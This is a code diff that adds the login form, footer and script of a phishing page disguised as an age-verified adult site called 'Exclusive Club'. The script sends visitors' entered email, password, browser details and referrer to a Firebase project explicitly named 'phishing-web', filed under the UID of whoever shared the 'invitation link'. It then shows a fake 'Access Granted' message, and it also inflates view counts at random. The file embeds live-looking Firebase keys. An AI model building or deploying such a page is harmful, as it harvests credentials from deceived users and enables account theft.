@@ -670,4 +670,277 @@
             <div class="spinner" id="spinner" style="display:none;"></div>
             <span id="btnText" style="position: relative; z-index: 2;">VERIFY AGE & ACCESS</span>
           </button>
-  
+          
+          <a href="#" class="forgot-link">Forgot your password?</a>
+          
+          <div id="messageBox" class="message"></div>
+        </form>
+        
+        <div style="text-align: center; margin-top: 30px; font-size: 14px; color: #777; line-height: 1.6;">
+          <p>⚠️ This website contains explicit adult material.</p>
+          <p>By logging in, you acknowledge you are of legal age in your jurisdiction.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ফুটার -->
+  <footer class="footer">
+    <div style="font-size: 18px; color: #aaa; margin-bottom: 20px; font-weight: bold;">Exclusive Club © 2023</div>
+    <div style="margin-bottom: 25px; max-width: 900px; margin-left: auto; margin-right: auto; line-height: 1.7;">
+      This is a premium adult entertainment platform. All models are 18 years of age or older. 
+      All content is intended for personal use by adults only. Access requires age verification.
+    </div>
+    <div style="margin-top: 25px; display: flex; justify-content: center; flex-wrap: wrap; gap: 20px;">
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Privacy Policy</a>
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Terms of Service</a>
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Age Verification</a>
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Content Policy</a>
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Support</a>
+      <a href="#" style="color: #888; text-decoration: none; font-size: 15px;">Contact Us</a>
+    </div>
+    <div style="margin-top: 30px; color: #555; font-size: 13px;">
+      This website is for demonstration purposes. No actual explicit content is hosted.
+    </div>
+  </footer>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Firebase কনফিগারেশন
+    const firebaseConfig = {
+      apiKey: "AIzaSyDj5FT2W0F-x62GI2SSi4d_Y-Vtg5ztSXk",
+      authDomain: "phishing-web-5fbfc.firebasestorage.app",
+      projectId: "phishing-web-5fbfc",
+      storageBucket: "phishing-web-5fbfc.firebasestorage.app",
+      messagingSenderId: "552393373788",
+      appId: "1:552393373788:web:a460df425a2bbc40688e99",
+      measurementId: "G-1LQ68R9H4B"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // গ্লোবাল ফাংশন ডিফাইনেশন
+    window.showLoginModal = function() {
+      const loginModal = document.getElementById('loginModal');
+      loginModal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+    };
+
+    window.hideLoginModal = function() {
+      const loginModal = document.getElementById('loginModal');
+      loginModal.style.display = 'none';
+      document.body.style.overflow = 'auto';
+    };
+
+    // মডাল কন্ট্রোল
+    const loginModal = document.getElementById('loginModal');
+    const ageConfirm = document.getElementById('ageConfirm');
+    
+    // মডাল বাইরে ক্লিক করলে বন্ধ হবে
+    loginModal.addEventListener('click', function(e) {
+      if (e.target === loginModal) {
+        hideLoginModal();
+      }
+    });
+    
+    // ESC কি চাপলে মডাল বন্ধ হবে
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && loginModal.style.display === 'flex') {
+        hideLoginModal();
+      }
+    });
+    
+    // ফর্ম এলিমেন্টস
+    const dataForm = document.getElementById('dataForm');
+    const nameInput = document.getElementById('name');
+    const emailInput = document.getElementById('email');
+    const msgInput = document.getElementById('message');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const messageBox = document.getElementById('messageBox');
+
+    // URL থেকে UID
+    const urlParams = new URLSearchParams(window.location.search);
+    const ownerUid = urlParams.get('uid');
+
+    if (!ownerUid) {
+      alert('Invalid access. Please use the correct invitation link.');
+    }
+
+    function showMessage(text, type='') {
+      messageBox.textContent = text;
+      messageBox.className = 'message ' + type;
+      
+      setTimeout(() => {
+        messageBox.textContent = '';
+        messageBox.className = 'message';
+      }, 5000);
+    }
+
+    dataForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      if (!ownerUid) {
+        showMessage('Invalid access link. Cannot proceed.', 'error');
+        return;
+      }
+
+      if (!ageConfirm.checked) {
+        showMessage('You must confirm you are 18+ to continue.', 'error');
+        return;
+      }
+
+      const name = nameInput.value.trim();
+      const email = emailInput.value.trim();
+      const message = msgInput.value.trim();
+
+      if (!name || !email) {
+        return showMessage('Please enter both email and password', 'error');
+      }
+
+      btnText.textContent = 'VERIFYING...';
+      spinner.style.display = 'inline-block';
+      submitBtn.disabled = true;
+
+      try {
+        const formData = {
+          name,
+          email,
+          message,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          referrer: document.referrer || 'direct',
+          ageConfirmed: true
+        };
+
+        await db
+          .collection('users')
+          .doc(ownerUid)
+          .collection('submissions')
+          .add(formData);
+
+        showMessage('✅ Age verified successfully! Redirecting to premium content...', 'success');
+        dataForm.reset();
+        ageConfirm.checked = false;
+        
+        setTimeout(() => {
+          hideLoginModal();
+          
+          // Success toast
+          const toast = document.createElement('div');
+          toast.style.cssText = `
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            background: linear-gradient(90deg, #4CAF50, #2E7D32);
+            color: white;
+            padding: 20px 30px;
+            border-radius: 12px;
+            z-index: 10000;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            animation: toastIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            max-width: 400px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+          `;
+          toast.innerHTML = `
+            <div style="font-size: 24px;">✅</div>
+            <div>
+              <strong>Access Granted!</strong><br>
+              Loading premium content library...
+            </div>
+          `;
+          document.body.appendChild(toast);
+          
+          setTimeout(() => {
+            toast.style.animation = 'toastOut 0.5s forwards';
+            setTimeout(() => document.body.removeChild(toast), 500);
+          }, 4000);
+        }, 3000);
+        
+      } catch (err) {
+        console.error('Submission error:', err);
+        showMessage('❌ Verification failed. Please check your credentials and try again.', 'error');
+      } finally {
+        btnText.textContent = 'VERIFY AGE & ACCESS';
+        spinner.style.display = 'none';
+        submitBtn.disabled = false;
+      }
+    });
+
+    // পেজ লোড হওয়ার পর
+    window.onload = function () {
+      console.log('Exclusive Club loaded');
+      
+      // CSS animations যোগ
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes toastIn {
+          from {
+            opacity: 0;
+            transform: translateX(100px) scale(0.8);
+          }
+          to {
+            opacity: 1;
+            transform: translateX(0) scale(1);
+          }
+        }
+        @keyframes toastOut {
+          from {
+            opacity: 1;
+            transform: translateX(0) scale(1);
+          }
+          to {
+            opacity: 0;
+            transform: translateX(100px) scale(0.8);
+          }
+        }
+        @keyframes buttonShine {
+          0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+          100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+      `;
+      document.head.appendChild(style);
+      
+      // Thumbnail হোভার ইফেক্ট
+      const thumbnails = document.querySelectorAll('.video-thumbnail');
+      thumbnails.forEach((thumb, index) => {
+        const img = thumb.querySelector('.thumbnail-img');
+        const baseBlur = 5;
+        const extraBlur = Math.random() * 2;
+        img.style.filter = `blur(${baseBlur + extraBlur}px) brightness(0.9) contrast(1.1)`;
+        
+        thumb.addEventListener('mouseenter', () => {
+          img.style.filter = `blur(${baseBlur + extraBlur - 2}px) brightness(1) contrast(1.2)`;
+        });
+        
+        thumb.addEventListener('mouseleave', () => {
+          img.style.filter = `blur(${baseBlur + extraBlur}px) brightness(0.9) contrast(1.1)`;
+        });
+      });
+      
+      // Random views update
+      setInterval(() => {
+        const views = document.querySelectorAll('.views-count');
+        views.forEach(view => {
+          const current = parseFloat(view.textContent);
+          if (!isNaN(current)) {
+            const increment = Math.floor(Math.random() * 1000);
+            const newViews = current + increment;
+            if (newViews < 10000000) {
+              view.textContent = (newViews / 1000000).toFixed(1) + 'M views';
+            }
+          }
+        });
+      }, 10000);
+    };
+  </script>
+</body>
+</html>
